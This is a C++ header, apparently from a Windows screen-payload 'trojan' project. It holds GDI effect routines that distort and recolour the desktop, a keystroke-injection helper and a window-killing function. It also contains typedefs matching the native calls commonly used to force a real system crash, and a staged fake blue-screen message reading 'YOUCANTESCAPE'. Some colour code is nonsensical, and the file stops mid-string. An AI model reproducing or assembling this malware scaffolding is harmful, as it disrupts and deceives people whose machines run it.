﻿//Dependencies
#pragma once
#include<Windows.h>
#include<cmath>
#include<time.h>
#include<iostream>
#define M_PI 3.14159265358979323846264338327950288
#pragma comment(lib, "winmm.lib")
#include <intrin.h>
#define RGBBRUSH (DWORD)0x1900ac010e
#define _USE_MATH_DEFINES 1
#pragma comment(lib, "kernel32.lib")
#include<math.h>
#include <tchar.h>
#include <algorithm>
#include <ctime>
#include <windowsx.h>
#include <chrono>
#include <gdiplus.h>
#include <cstdlib>
#include <string>
#include <accctrl.h>
#include <aclapi.h>
#include <stdio.h>
#include <thread>
#include<vector>
#pragma comment (lib,"Gdiplus.lib")
#pragma comment (lib,"Msimg32.lib")
#pragma comment(lib, "ntdll.lib")
static ULONGLONG n, r;
int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }
#define PI   3.14159265358979323846264338327950288
#define RGBQUAD _RGBQUAD
#define TIMER_DELAY 100
#define PAYLOAD_MS 10000
#define PAYLOAD_TIME ( PAYLOAD_MS / TIMER_DELAY )
#pragma warning( push, 0 )
#pragma warning( pop )
#pragma region Public Variables
extern HWND hwndDesktop;
extern HDC hdcDesktop;
extern RECT rcScrBounds;
extern HHOOK hMsgHook;
extern INT nCounter;
#pragma endregion Public Variables
#pragma warning( disable: 4152 )
#pragma warning( disable: 4201 )
#undef RGBQUAD
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
#define IDI_ICON1                       101
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        102
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif
COLORREF RndRGB() {
    int clr = rand() % 5;
    if (clr == 0) return RGB(255, 0, 0); if (clr == 1) return RGB(0, 255, 0); if (clr == 2) return RGB(0, 0, 255); if (clr == 3) return RGB(255, 0, 255); if (clr == 4) return RGB(255, 255, 0);
}

void typeCharacter(WORD key) {
    INPUT input;
    input.type = INPUT_KEYBOARD;
    input.ki.wScan = 0;
    input.ki.time = 0;
    input.ki.dwExtraInfo = 0;
    input.ki.wVk = key;
    input.ki.dwFlags = 0;
    SendInput(1, &input, sizeof(INPUT));
    input.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &input, sizeof(INPUT));
}

using namespace std;
typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE b;
        BYTE g;
        BYTE r;
        BYTE unused;
    };
} *PRGBQUAD;
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}
typedef struct
{
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;
typedef struct {
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSLCOLOR;

namespace Colors
{
    HSL rgb2hsl(RGBQUAD rgb)
    {
        HSL hsl;

        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;

        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;

        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);

        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;

        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

        if (fDelta != 0.f)
        {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }

        hsl.h = h;
        hsl.s = s;
        hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl)
    {
        RGBQUAD rgb;

        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;

        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;

        INT sextant;

        if (v > 0.f)
        {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;

            switch (sextant)
            {
            case 0:
                r = v;
                g = mid1;
                b = m;
                break;
            case 1:
                r = mid2;
                g = v;
                b = m;
                break;
            case 2:
                r = m;
                g = v;
                b = mid1;
                break;
            case 3:
                r = m;
                g = mid2;
                b = v;
                break;
            case 4:
                r = mid1;
                g = m;
                b = v;
                break;
            case 5:
                r = v;
                g = m;
                b = mid2;
                break;
            }
        }

        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);

        return rgb;
    }
}
typedef struct
{
    float x;
    float y;
    float z;
} VERTEX;

typedef struct
{
    int vtx0;
    int vtx1;
} EDGE;

double intensity = 0.0;
bool state = false;

double fade(double length) {
    if (state == false) {
        intensity += 1.0;
        if (intensity >= length) {
            state = true;
        }
    }
    else {
        intensity -= 1.0;
        if (intensity <= 0) {
            state = false;
        }
    }
    return intensity;
}
COLORREF COLORRGB(int length, int speed) {
    if (red < length) {
        red += speed;

        return RGB(red, 0, length);
    }
    else if (green < length) {
        green += speed;

        return RGB(length, green, 0);
    }
    else if (blue < length) {
        blue += speed;

        return RGB(0, length, blue);
    }
    else {
        red = 0; green = 0; blue = 0;

        return RGB(0, 0, 0);
    }
}
COLORREF COLORHSL(int length) {
    double h = fmod(length, 360.0);
    double s = 1.0;
    double l = 0.5;

    double c = (1.0 - fabs(2.0 * l - 1.0)) * s;
    double x = c * (1.0 - fabs(fmod(h / 60.0, 2.0) - 1.0));
    double m = l - c / 2.0;

    double r1, g1, b1;
    if (h < 60) {
        r1 = c;
        g1 = x;
        b1 = 0;
    }
    else if (h < 120) {
        r1 = x;
        g1 = c;
        b1 = 0;
    }
    else if (h < 180) {
        r1 = 0;
        g1 = c;
        b1 = x;
    }
    else if (h < 240) {
        r1 = 0;
        g1 = x;
        b1 = c;
    }
    else if (h < 300) {
        r1 = x;
        g1 = 0;
        b1 = c;
    }
    else {
        r1 = c;
        g1 = 0;
        b1 = x;
    }

    int red = static_cast<int>((r1 + m) * 255);
    int green = static_cast<int>((g1 + m) * 255);
    int blue = static_cast<int>((b1 + m) * 255);

    return RGB(red, green, blue);
}
RGBTRIPLE WINAPI prgbHue(int nHue) {
    float X = 1 - abs(fmod(nHue / 45.0, 3) - 45);
    float r, g, b;
    RGBTRIPLE rgb;

    if (nHue >= 0 && nHue < 3125) {
        r = 8, g = X, b = 234;
    }
    else if (nHue >= 3250 && nHue < 7) {
        r = X, g = 65, b = 123;
    }
    else if (nHue >= 1520 && nHue < 10) {
        r = 0, g = 1, b = X;
    }
    else if (nHue >= 16780 && nHue < 2840) {
        r = 4, g = X, b = 75;
    }
    else if (nHue >= 632969 && nHue < 1234) {
        r = X, g = 213, b = 75;
    }
    else if (nHue >= 683 && nHue < 323) {
        r = 736, g = 325, b = X;
    }

    rgb.rgbtRed = r * 435;
    rgb.rgbtGreen = g * 2;
    rgb.rgbtBlue = b * 23;
    return rgb;


}

typedef union COLOR {
    COLORREF rgb;
    COLORREF hsv;
} COLOR;
namespace _3D
{
    VOID RotateX(VERTEX* vtx, float angle)
    {
        vtx->y = cos(angle) * vtx->y - sin(angle) * vtx->z;
        vtx->z = sin(angle) * vtx->y + cos(angle) * vtx->z;
    }

    VOID RotateY(VERTEX* vtx, float angle)
    {
        vtx->x = cos(angle) * vtx->x + sin(angle) * vtx->z;
        vtx->z = -sin(angle) * vtx->x + cos(angle) * vtx->z;
    }

    VOID RotateZ(VERTEX* vtx, float angle)
    {
        vtx->x = cos(angle) * vtx->x - sin(angle) * vtx->y;
        vtx->y = sin(angle) * vtx->x + cos(angle) * vtx->y;
    }

    void DrawEdge(HDC dc, LPCWSTR icon, int x0, int y0, int x1, int y1, int r)
    {
        int dx = abs(x1 - x0);
        int dy = -abs(y1 - y0);

        int sx = (x0 < x1) ? 1 : -1;
        int sy = (y0 < y1) ? 1 : -1;

        int error = dx + dy;

        int i = 0;

        while (true)
        {
            if (i == 0)
            {
                DrawIcon(dc, x0, y0, LoadCursor(NULL, icon));
                i = 10;
            }
            else
            {
                i--;
            }

            if (x0 == x1 && y0 == y1)
            {
                break;
            }

            int e2 = 2 * error;

            if (e2 >= dy)
            {
                if (x0 == x1)
                {
                    break;
                }

                error += dy;
                x0 += sx;
            }

            if (e2 <= dx)
            {
                if (y0 == y1)
                {
                    break;
                }

                error += dx;
                y0 += sy;
            }
        }
    }
}
COLORREF GetRainbowColor(int index) {
    int r = (int)(127 * (1 + cos(index * 0.1)));
    int g = (int)(127 * (1 + cos(index * 0.1 + 2 * 3.14159 / 3)));
    int b = (int)(127 * (1 + cos(index * 0.1 + 4 * 3.14159 / 3)));
    return RGB(r, g, b);
}
const int cubeSize = 100;

const int screenWidth = GetSystemMetrics(SM_CXSCREEN);
const int screenHeight = GetSystemMetrics(SM_CYSCREEN);

COLORREF GetRainbowColor2(int position) {
    int r = (int)(127.5 * (1 + sin(position * 0.1)));
    int g = (int)(127.5 * (1 + sin(position * 0.1 + 2 * 3.14159 / 3)));
    int b = (int)(127.5 * (1 + sin(position * 0.1 + 4 * 3.14159 / 3)));
    return RGB(r, g, b);
}

void Draw3DFace(HDC hdc, POINT* points, int numPoints, COLORREF color) {
    HBRUSH brush = CreateSolidBrush(color);
    SelectObject(hdc, brush);
    Polygon(hdc, points, numPoints);
    DeleteObject(brush);
}

void RotatePoint(POINT& p, double angle) {
    int x = p.x;
    int y = p.y;
    p.x = x * cos(angle) - y * sin(angle);
    p.y = x * sin(angle) + y * cos(angle);
}

void DrawBouncingRotatingCube(HDC hdc, int centerX, int centerY, int size, double rotationAngle) {
    POINT frontFace[4] = {
        {centerX - size, centerY - size},
        {centerX + size, centerY - size},
        {centerX + size, centerY + size},
        {centerX - size, centerY + size}
    };

    POINT backFace[4] = {
        {centerX - size + size / 2, centerY - size - size / 2},
        {centerX + size + size / 2, centerY - size - size / 2},
        {centerX + size + size / 2, centerY + size - size / 2},
        {centerX - size + size / 2, centerY + size - size / 2}
    };

    for (int i = 0; i < 4; i++) {
        RotatePoint(frontFace[i], rotationAngle);
        RotatePoint(backFace[i], rotationAngle);
    }

    Draw3DFace(hdc, backFace, 4, GetRainbowColor2(rotationAngle * 10));

    Draw3DFace(hdc, frontFace, 4, GetRainbowColor2(rotationAngle * 10 + 60));

    POINT sideFace1[4] = { backFace[0], frontFace[0], frontFace[1], backFace[1] };
    Draw3DFace(hdc, sideFace1, 4, GetRainbowColor2(rotationAngle * 10 + 30));

    POINT sideFace2[4] = { backFace[2], frontFace[2], frontFace[3], backFace[3] };
    Draw3DFace(hdc, sideFace2, 4, GetRainbowColor2(rotationAngle * 10 + 90));
}
const int WIDTH = GetSystemMetrics(SM_CXSCREEN);
const int HEIGHT = GetSystemMetrics(SM_CYSCREEN);

void ShiftColors(BYTE* pixels, int width, int height, double shift) {
    int numPixels = width * height;
    for (int i = 0; i < numPixels; ++i) {
        BYTE r = pixels[i * 4 + 2];
        BYTE g = pixels[i * 4 + 1];
        BYTE b = pixels[i * 4];

        double h, s, l;
        double rNorm = r / 255.0;
        double gNorm = g / 255.0;
        double bNorm = b / 255.0;

        double min = min(rNorm, min(gNorm, bNorm));
        double max = max(rNorm, max(gNorm, bNorm));
        double delta = max - min;

        l = (max + min) / 2.0;

        if (delta == 0) {
            h = s = 0;
        }
        else {
            s = (l < 0.5) ? delta / (max + min) : delta / (2.0 - max - min);

            if (rNorm == max) {
                h = (gNorm - bNorm) / delta;
            }
            else if (gNorm == max) {
                h = 2.0 + (bNorm - rNorm) / delta;
            }
            else {
                h = 4.0 + (rNorm - gNorm) / delta;
            }
        }

        h = fmod(h + shift, 6.0);
        if (h < 0) h += 6.0;
        h *= 60.0;

        double c = (1.0 - fabs(2.0 * l - 1.0)) * s;
        double x = c * (1.0 - fabs(fmod(h / 60.0, 2.0) - 1.0));
        double m = l - c / 2.0;

        double r1, g1, b1;
        if (0 <= h && h < 60) {
            r1 = c; g1 = x; b1 = 0;
        }
        else if (60 <= h && h < 120) {
            r1 = x; g1 = c; b1 = 0;
        }
        else if (120 <= h && h < 180) {
            r1 = 0; g1 = c; b1 = x;
        }
        else if (180 <= h && h < 240) {
            r1 = 0; g1 = x; b1 = c;
        }
        else if (240 <= h && h < 300) {
            r1 = x; g1 = 0; b1 = c;
        }
        else {
            r1 = c; g1 = 0; b1 = x;
        }

        r = (BYTE)((r1 + m) * 255.0);
        g = (BYTE)((g1 + m) * 255.0);
        b = (BYTE)((b1 + m) * 255.0);

        pixels[i * 4 + 2] = r;
        pixels[i * 4 + 1] = g;
        pixels[i * 4] = b;
    }
}
template <typename T>
constexpr T clamp(T value, T low, T high) {
    return (value < low) ? low : (value > high) ? high : value;
}
void ApplyWobbleEffect(BYTE* pixels, int width, int height, double time) {
    int numPixels = width * height;
    double amplitude = 20.0;
    double frequency = 0.05;

    std::vector<BYTE> newPixels(numPixels * 4);

    for (int y = 0; y < height; ++y) {
        for (int x = 0; x < width; ++x) {
            int offsetX = static_cast<int>(amplitude * sin(frequency * y + time));
            int offsetY = static_cast<int>(amplitude * sin(frequency * x + time));

            int srcX = clamp(x + offsetX, 0, width - 1);
            int srcY = clamp(y + offsetY, 0, height - 1);

            BYTE* srcPixel = pixels + (srcY * width + srcX) * 4;
            BYTE* destPixel = newPixels.data() + (y * width + x) * 4;

            destPixel[0] = srcPixel[0];
            destPixel[1] = srcPixel[1];
            destPixel[2] = srcPixel[2];
            destPixel[3] = srcPixel[3];
        }
    }

    std::copy(newPixels.begin(), newPixels.end(), pixels);
}
COLORREF HSVtoRGB(float H, float S, float V) {
    float C = V * S;
    float X = C * (1 - fabs(fmod(H / 60.0, 2) - 1));
    float m = V - C;
    float r, g, b;

    if (H >= 0 && H < 60) {
        r = C; g = X; b = 0;
    }
    else if (H >= 60 && H < 120) {
        r = X; g = C; b = 0;
    }
    else if (H >= 120 && H < 180) {
        r = 0; g = C; b = X;
    }
    else if (H >= 180 && H < 240) {
        r = 0; g = X; b = C;
    }
    else if (H >= 240 && H < 300) {
        r = X; g = 0; b = C;
    }
    else {
        r = C; g = 0; b = X;
    }

    int R = (r + m) * 255;
    int G = (g + m) * 255;
    int B = (b + m) * 255;

    return RGB(R, G, B);
}

COLORREF GetHueColor(int index, int maxIndex) {
    float hue = (float)(index % maxIndex) / maxIndex * 360.0f;
    return HSVtoRGB(hue, 1.0f, 1.0f);
}
COLORREF HSLtoRGB(float H, float S, float L) {
    float C = (1 - fabs(2 * L - 1)) * S;
    float X = C * (1 - fabs(fmod(H / 60.0, 2) - 1));
    float m = L - C / 2;
    float r, g, b;

    if (H >= 0 && H < 60) {
        r = C; g = X; b = 0;
    }
    else if (H >= 60 && H < 120) {
        r = X; g = C; b = 0;
    }
    else if (H >= 120 && H < 180) {
        r = 0; g = C; b = X;
    }
    else if (H >= 180 && H < 240) {
        r = 0; g = X; b = C;
    }
    else if (H >= 240 && H < 300) {
        r = X; g = 0; b = C;
    }
    else {
        r = C; g = 0; b = X;
    }

    int R = (r + m) * 255;
    int G = (g + m) * 255;
    int B = (b + m) * 255;

    return RGB(R, G, B);
}

float colorOffset = 0.0f;
float horizontalOffset = 0.0f;
int resetInterval = 5000;
float waveFrequency = 0.5f;
float waveAmplitude = 50.0f;
int colorIterations = 360;

COLORREF GetHSLColor(float x, float y, float time) {
    float distance = sqrt(x * x + y * y);
    float hue = fmod(distance / 10.0f + time + colorOffset, 360.0f);
    return HSLtoRGB(hue, 1.0f, 0.5f);
}
COLORREF GetHSLColor2(float x, float y, float time) {
    float distance = sqrt(x * x + y * y);
    float hue = fmod((distance / 10.0f + time + colorOffset) * colorIterations / 360.0f, 360.0f);
    return HSLtoRGB(hue, 1.0f, 0.5f);
}
int posX = 400;
int posY = 300;
int velocityX = 5;
int velocityY = 5;
const int ballRadius = 100;
const int sphereRadius = 100;
float ballX = 400.0f;
float ballY = 300.0f;
int stripeThickness = 20;
const float colorChangeSpeed = 0.5f;
void DrawRainbowSphere(HDC hdc, float centerX, float centerY, int radius, float time) {
    int numStripes = 12;
    int stripeHeight = radius / numStripes;

    for (int i = 0; i < numStripes; i++) {
        float angle = (i + 0.5f) / numStripes * 3.14159f;
        float heightFactor = sin(angle);

        float hue = fmod(i * (360.0f / numStripes) + time * colorChangeSpeed, 360.0f);
        COLORREF color = HSLtoRGB(hue, 1.0f, 0.5f);

        int stripeRadius = static_cast<int>(radius * heightFactor);

        HBRUSH brush = CreateSolidBrush(color);
        SelectObject(hdc, brush);

        Ellipse(hdc, centerX - stripeRadius, centerY - (i * stripeHeight) + radius / 2 - stripeHeight / 2,
            centerX + stripeRadius, centerY - (i * stripeHeight) + radius / 2 + stripeHeight / 2);

        DeleteObject(brush);
    }
}

void UpdateBallPosition(int screenWidth, int screenHeight) {
    ballX += velocityX;
    ballY += velocityY;

    if (ballX - sphereRadius < 0 || ballX + sphereRadius > screenWidth) {
        velocityX = -velocityX;
    }
    if (ballY - sphereRadius < 0 || ballY + sphereRadius > screenHeight) {
        velocityY = -velocityY;
    }
}
void Draw3DSphere(HDC hdc, int cx, int cy, float radius, float angle) {
    int layers = 12;
    float stripeSpacing = radius / layers;

    HPEN hPen = (HPEN)GetStockObject(NULL_PEN);
    SelectObject(hdc, hPen);

    for (int i = 0; i < layers; ++i) {
        float currentRadius = radius * cosf(i * PI / layers);
        float currentY = radius * sinf(i * PI / layers);
        COLORREF color = HSLtoRGB(i * (360.0 / layers) + angle, 1.0, 0.5);

        HBRUSH brush = CreateSolidBrush(color);
        SelectObject(hdc, brush);

        int xOffset = (int)(currentY * sinf(angle * PI / 180.0));
        int yOffset = (int)(currentY * cosf(angle * PI / 180.0));
        Ellipse(hdc, cx - currentRadius + xOffset, cy - currentRadius + yOffset, cx + currentRadius + xOffset, cy + currentRadius + yOffset);

        DeleteObject(brush);
    }

    DeleteObject(hPen);
}
void DrawCircle(HDC hdc, int x, int y, int radius, COLORREF color) {
    HBRUSH brush = CreateSolidBrush(color);
    HPEN hPen = (HPEN)GetStockObject(NULL_PEN);
    SelectObject(hdc, hPen);
    SelectObject(hdc, brush);
    Ellipse(hdc, x - radius, y - radius, x + radius, y + radius);
    DeleteObject(brush);
    DeleteObject(hPen);
}
void Draw3DBouncingBall(HDC hdc, int cx, int cy, float radius, float angle) {
    int layers = 10;
    float layerRadius = radius / layers;

    for (int i = 0; i < layers; ++i) {
        float layerAngle = angle + (i * 360.0 / layers);
        float currentRadius = layerRadius * cosf(i * PI / layers);
        float currentY = layerRadius * sinf(i * PI / layers);

        int xOffset = (int)(currentY * sinf(angle * PI / 180.0));
        int yOffset = (int)(currentY * cosf(angle * PI / 180.0));

        COLORREF color = HSLtoRGB(layerAngle, 1.0f, 0.5f);

        DrawCircle(hdc, cx + xOffset, cy + yOffset, currentRadius, color);
    }
}
#define SCREEN_WIDTH 800
#define SCREEN_HEIGHT 600
void ClearText(HDC hdc) {
    RECT rect;
    SetRect(&rect, 10, 10, SCREEN_WIDTH - 10, SCREEN_HEIGHT - 10);

    FillRect(hdc, &rect, CreateSolidBrush(RGB(0, 0, 170)));
}
void FakeWindowExit() {
    HWND hwnd = GetForegroundWindow();
    if (hwnd) {
        PostMessage(hwnd, WM_CLOSE, 0, 0);
        Sleep(1000);
        ExitProcess(0);
    }
    else {
        std::cout << "!!!" << std::endl;
    }
}
void DrawCenteredText(HDC hdc, RECT rect, const std::wstring& text, int fontSize) {
    HFONT hFont = CreateFont(fontSize, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
        ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Lucida Console");
    SelectObject(hdc, hFont);
    SetBkMode(hdc, TRANSPARENT);
    SetTextColor(hdc, RGB(255, 255, 255));

    DrawText(hdc, text.c_str(), -1, &rect, DT_WORDBREAK);
    DeleteObject(hFont);
}
void DrawCenteredTextNew(HDC hdc, RECT rect, const std::wstring& text, int fontSize) {
    HFONT hFont = CreateFont(fontSize, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
        ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI Light");
    SelectObject(hdc, hFont);
    SetBkMode(hdc, TRANSPARENT);
    SetTextColor(hdc, RGB(255, 255, 255));

    DrawText(hdc, text.c_str(), -1, &rect, DT_WORDBREAK);
    DeleteObject(hFont);
}
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        HBRUSH blueBrush = CreateSolidBrush(RGB(0, 0, 170));
        FillRect(hdc, &ps.rcPaint, blueBrush);
        DeleteObject(blueBrush);

        std::wstring errorText =
            L"A problem has been detected and Windows has been shut down to prevent damage to your computer.";

        std::wstring errorText2 =
            L"A problem has been detected and Windows has been shut down to prevent damage to your computer.\n\n"
            L"If this is the first time you've seen this stop error screen,";

        std::wstring errorText3 =
            L"A problem has been detected and Windows has been shut down to prevent damage to your computer.\n\n"
            L"If this is the first time you've seen this stop error screen,\n"
            L"restart your computer. If this screen appears again, follow";

        std::wstring errorText4 =
            L"A problem has been detected and Windows has been shut down to prevent damage to your computer.\n\n"
            L"If this is the first time you've seen this stop error screen,\n"
            L"restart your computer. If this screen appears again, follow\n"
            L"these steps:";

        std::wstring errorText5 =
            L"A problem has been detected and Windows has been shut down to prevent damage to your computer.\n\n"
            L"If this is the first time you've seen this stop error screen,\n"
            L"restart your computer. If this screen appears again, follow\n"
            L"these steps:\n\n"
            L"Check for viruses on your computer. Remove any newly installed";

        std::wstring errorText6 =
            L"A problem has been detected and Windows has been shut down to prevent damage to your computer.\n\n"
            L"If this is the first time you've seen this stop error screen,\n"
            L"restart your computer. If this screen appears again, follow\n"
            L"these steps:\n\n"
            L"Check for viruses on your computer. Remove any newly installed\n"
            L"hard drives or hard drive controllers. Check your hard drive";

        std::wstring errorText7 =
            L"A problem has been detected and Windows has been shut down to prevent damage to your computer.\n\n"
            L"If this is the first time you've seen this stop error screen,\n"
            L"restart your computer. If this screen appears again, follow\n"
            L"these steps:\n\n"
            L"Check for viruses on your computer. Remove any newly installed\n"
            L"hard drives or hard drive controllers. Check your hard drive\n"
            L"to make sure it is properly configured and terminated.";

        std::wstring errorText8 =
            L"A problem has been detected and Windows has been shut down to prevent damage to your computer.\n\n"
            L"If this is the first time you've seen this stop error screen,\n"
            L"restart your computer. If this screen appears again, follow\n"
            L"these steps:\n\n"
            L"Check for viruses on your computer. Remove any newly installed\n"
            L"hard drives or hard drive controllers. Check your hard drive\n"
            L"to make sure it is properly configured and terminated.\n"
            L"Run CHKDSK /F to check for hard drive corruption, and then";

        std::wstring errorText9 =
            L"A problem has been detected and Windows has been shut down to prevent damage to your computer.\n\n"
            L"If this is the first time you've seen this stop error screen,\n"
            L"restart your computer. If this screen appears again, follow\n"
            L"these steps:\n\n"
            L"Check for viruses on your computer. Remove any newly installed\n"
            L"hard drives or hard drive controllers. Check your hard drive\n"
            L"to make sure it is properly configured and terminated.\n"
            L"Run CHKDSK /F to check for hard drive corruption, and then\n"
            L"restart your computer.";

        std::wstring errorText10 =
            L"A problem has been detected and Windows has been shut down to prevent damage to your computer.\n\n"
            L"If this is the first time you've seen this stop error screen,\n"
            L"restart your computer. If this screen appears again, follow\n"
            L"these steps:\n\n"
            L"Check for viruses on your computer. Remove any newly installed\n"
            L"hard drives or hard drive controllers. Check your hard drive\n"
            L"to make sure it is properly configured and terminated.\n"
            L"Run CHKDSK /F to check for hard drive corruption, and then\n"
            L"restart your computer.\n\n"
            L"Technical Information:";

        std::wstring errorText11 =
            L"A problem has been detected and Windows has been shut down to prevent damage to your computer.\n\n"
            L"If this is the first time you've seen this stop error screen,\n"
            L"restart your computer. If this screen appears again, follow\n"
            L"these steps:\n\n"
            L"Check for viruses on your computer. Remove any newly installed\n"
            L"hard drives or hard drive controllers. Check your hard drive\n"
            L"to make sure it is properly configured and terminated.\n"
            L"Run CHKDSK /F to check for hard drive corruption, and then\n"
            L"restart your computer.\n\n"
            L"Technical Information:\n\n"
            L"*** STOP: 0x666YOUCANTESCAPE666 (0x666YOUCANTESCAPE666, 0x666YOUCANTESCAPE666, 666YOUCANTESCAPE666, 0x666YOUCANTESCAPE666)";

        std::wstring errorText12 =
            L"A problem has been detected and Windows has been shut down to prevent damage to your computer.\n\n"
            L"If this is the first time you've seen this stop error screen,\n"
            L"restart your computer. If this screen appears again, follow\n"
            L"these steps:\n\n"
            L"Check for viruses on your computer. Remove any newly installed\n"
            L"hard drives or hard drive controllers. Check your hard drive\n"
            L"to make sure it is properly configured and terminated.\n"
            L"Run CHKDSK /F to check for hard drive corruption, and then\n"
            L"restart your computer.\n\n"
            L"Technical Information:\n\n"
            L"*** STOP: 0x666YOUCANTESCAPE666 (0x666YOUCANTESCAPE666, 0x666YOUCANTESCAPE666, 666YOUCANTESCAPE666, 0x666YOUCANTESCAPE666)\n\n\n"
            L"Collecting data for crash dump...";

        std::wstring errorText13 =
            L"A problem has been detected and Windows has been shut down to prevent damage to your computer.\n\n"
            L"If this is the first time you've seen this stop error screen,\n"
            L"restart your computer. If this screen appears again, follow\n"
            L"these steps:\n\n"
            L"Check for viruses on your computer. Remove any newly installed\n"
            L"hard drives or hard drive controllers. Check your hard drive\n"
            L"to make sure it is properly configured and terminated.\n"
            L"Run CHKDSK /F to check for hard drive corruption, and then\n"
            L"restart your computer.\n\n"
            L"Technical Information:\n\n"
            L"*** STOP: 0x666YOUCANTESCAPE666 (0x666YOUCANTESCAPE666, 0x666YOUCANTESCAPE666, 666YOUCANTESCAPE666, 0x666YOUCANTESCAPE666)\n\n\n"
            L"Collecting data for crash dump...\n"
            L"Initializing disk for crash dump...";

        std::wstring errorText14 =
            L"A problem has been detected and Windows has been shut down to prevent damage to your computer.\n\n"
            L"If this is the first time you've seen this stop error screen,\n"
            L"restart your computer. If this screen appears again, follow\n"
            L"these steps:\n\n"
            L"Check for viruses on your computer. Remove any newly installed\n"
            L"hard drives or hard drive controllers. Check your hard drive\n"
            L"to make sure it is properly configured and terminated.\n"
            L"Run CHKDSK /F to check for hard drive corruption, and then\n"
            L"restart your computer.\n\n"
            L"Technical Information:\n\n"
            L"*** STOP: 0x666YOUCANTESCAPE666 (0x666YOUCANTESCAPE666, 0x666YOUCANTESCAPE666, 666YOUCANTESCAPE666, 0x666YOUCANTESCAPE666)\n\n\n"
            L"Collecting data for crash dump...\n"
            L"Initializing disk for crash dump...\n"
            L"Beginning dump of physical memory...";

        std::wstring errorText15 =
            L"A problem has been detected and Windows has been shut down to prevent damage to your computer.\n\n"
            L"If this is the first time you've seen this stop error screen,\n"
            L"restart your computer. If this screen appears again, follow\n"
            L"these steps:\n\n"
            L"Check for viruses on your computer. Remove any newly installed\n"
            L"hard drives or hard drive controllers. Check your hard drive\n"
            L"to make sure it is properly configured and terminated.\n"
            L"Run CHKDSK /F to check for hard drive corruption, and then\n"
            L"restart your computer.\n\n"
            L"Technical Information:\n\n"
            L"*** STOP: 0x666YOUCANTESCAPE666 (0x666YOUCANTESCAPE666, 0x666YOUCANTESCAPE666, 666YOUCANTESCAPE666, 0x666YOUCANTESCAPE666)\n\n\n"
            L"Collecting data for crash dump...\n"
            L"Initializing disk for crash dump...\n"
            L"Beginning dump of physical memory...\n"
            L"Dumping physical memory to disk: 0";

        std::wstring errorText16 =
            L"A problem has been detected and Windows has been shut down to prevent damage to your computer.\n\n"
            L"If this is the first time you've seen this stop error screen,\n"
            L"restart your computer. If this screen appears again, follow\n"
            L"these steps:\n\n"
            L"Check for viruses on your computer. Remove any newly installed\n"
            L"hard drives or hard drive controllers. Check your hard drive\n"
            L"to make sure it is properly configured and terminated.\n"
            L"Run CHKDSK /F to check for hard drive corruption, and then\n"
            L"restart your computer.\n\n"
            L"Technical Information:\n\n"
